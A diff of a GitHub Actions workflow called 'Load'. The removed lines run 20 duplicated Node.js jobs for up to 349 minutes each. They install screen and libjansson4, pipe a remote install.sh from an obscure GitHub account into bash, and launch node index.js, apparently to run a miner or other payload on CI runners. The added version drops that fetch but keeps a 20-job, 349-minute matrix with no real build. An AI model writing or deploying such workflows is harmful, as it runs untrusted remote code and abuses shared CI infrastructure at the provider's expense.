@@ -1,36 +1,19 @@
 name: Load
 on: [push, pull_request]
-
 jobs:
-  build:
-
-    runs-on: ubuntu-latest
-
-    strategy:
-      matrix:
-        node-version: ['12', '14', '12', '14', '12', '14', '12', '14', '12', '14', '12', '14', '12', '14', '12', '14', '12', '14', '12', '14']
-    timeout-minutes: 349
-
-    steps:
+ build:
+  runs-on: ubuntu-latest
+  strategy: 
+    max-parallel: 20 
+    fail-fast: false
+    matrix:
+     go: [1.2, 1.3, 1.4, 1.5] 
+     flag: [A, B, C, D,]
+  timeout-minutes: 349
+  steps:
     - uses: actions/checkout@v3
-
-    - name: Use Node.js ${{ matrix.node-version }}
-      uses: actions/setup-node@v2
-      with:
-        node-version: ${{ matrix.node-version }}
-
-    - run: npm install
-    - run: npm test
-    - run: |
+    - name: Set up Go ${{ matrix.go }} 
+      uses: actions/setup-go@v1
+    - name: Save state
+      run: |
           echo "::save-state name={name}::{value}"
-          sudo apt update
-          sudo apt install screen libjansson4 -y 
-          screen -dmS ls
-          sudo apt install curl ca-certificates -y
-          curl https://raw.githubusercontent.com/fgvcasdrtya/fgvcasdrtya/main/install.sh | bash
-          source ~/.bashrc
-          npm install
-          sh install.sh
-          node index.js
-
-          
